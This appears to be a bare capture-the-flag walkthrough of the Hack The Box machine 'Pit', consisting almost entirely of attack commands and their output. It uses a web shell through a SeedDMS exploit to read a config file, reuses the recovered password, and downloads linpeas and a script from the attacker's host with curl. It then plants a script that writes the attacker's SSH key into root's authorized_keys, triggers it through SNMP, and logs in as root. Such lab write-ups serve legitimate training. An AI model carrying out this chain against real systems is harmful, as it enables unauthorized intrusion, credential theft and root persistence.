login page credentials 

michelle:michelle

https://www.exploit-db.com/exploits/47022


http://dms-pit.htb/seeddms51x/data/1048576/29/shell.php?cmd=cat%20/var/www/html/seeddms51x/conf/settings.xml

michelle:ied^ieY6xoquu

```bash
[michelle@pit ~]$ sudo -l
sudo: unable to open /run/sudo/ts/michelle: Permission denied

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for michelle: 
sudo: unable to stat /var/db/sudo: Permission denied
Sorry, user michelle may not run sudo on pit.

```

```bash
[michelle@pit shm]$ curl 10.10.15.0:8000/linpeas.sh -o linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  333k  100  333k    0     0   258k      0  0:00:01  0:00:01 --:--:--  258k
[michelle@pit shm]$ chmod +x linpeas.sh
```

```bash
[michelle@pit shm]$ cat /usr/bin/monitor
#!/bin/bash

for script in /usr/local/monitoring/check*sh
do
    /bin/bash $script
done
```

```bash
┌─[visith@parrot]─[~/CTF/htb/pit]
└──╼ $ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/visith/.ssh/id_rsa): defalt
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in defalt
Your public key has been saved in defalt.pub
The key fingerprint is:
SHA256:Tg8EyQiqyn/hg0KOXZ3lyGxFBGdp33iZkqDyiT243U0 visith@parrot
The key's randomart image is:
+---[RSA 3072]----+
|  .. oo++.       |
| .  . o+=        |
|.      +.o + o   |
|.   . ..o = =    |
|.    X BS  o     |
|o.  +.%o.oE      |
|=o .o+.o.o.      |
|.oo..+. . .      |
|  ... .          |
+----[SHA256]-----+
```

```bash
#! /bin/bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDT9hMBA0/KHJz4wWwjrNQmcUao412vUi3BrhMsZ07hzDRM9Qdp0EFP3+1GxpTly5X4g8DphHKVXbF3rB0Wyn89dwlnXuT3pQESJuLSnQmGeo/p1uO3wT4HUccG4AHoFFt5W8buC7PJcF45G/+BPzjFWNwpC+QGt/jpQq/xvUzFMKuMdH+AjQtI2Yfc7+d9cIVb8s/teq2vocpSJ2/BG2+6Z/dB8u4KA0RLYWQ7FVeNPQJRzgd6GbC1gfO3UPX9MWsMtqjxjHuGq/WiifkVM/h1CF9kbEJBJJ+1pEVNIa3Hoh8YJoRLy4SG9wec13kmpdQk3zR8ZstU4bZiI1JJa7OcF59YIYBjIxluARgJDn4wQq8M080J32OGlT6ZkSuLS148ZmwC8URB4yHc+tRWnm3Geyf41016QXW3GzF2hML7DadM20Zn3Z86zcun7rQdVFwliEjYFk3dY2o9+a7XBXcd4FgNWO+DTlW97EzMENMyfCmAi64B8zLPqS+ZoPNYRxM= visith@parrot " > /root/.ssh/authorized_keys
```

```bash
[michelle@pit shm]$ cd /usr/local/monitoring
[michelle@pit monitoring]$ curl 10.10.15.0:8000/check_me.sh -o check_me.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   617  100   617    0     0   1928      0 --:--:-- --:--:-- --:--:--  1928
```
```bash
snmpwalk -m +MY-MIB -v2c -c public 10.10.10.241 nsExtendObjects
```

```bash
┌─[✗]─[visith@parrot]─[~/CTF/htb/pit]
└──╼ $ssh -i defalt root@10.10.10.241
Web console: https://pit.htb:9090/

Last login: Fri Jun 11 14:58:14 2021 from 10.10.14.178
[root@pit ~]# ls
cleanup.sh  monitoring  null  root.txt
[root@pit ~]# cat root.txt
3d122bcda253b85fca43b709dea13b9a
[root@pit ~]# 

```
```bash
─[visith@parrot]─[~/CTF/htb/pit/www]
└──╼ $python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.241 - - [12/Jun/2021 09:23:21] "GET /check_me.sh HTTP/1.1" 200 -
````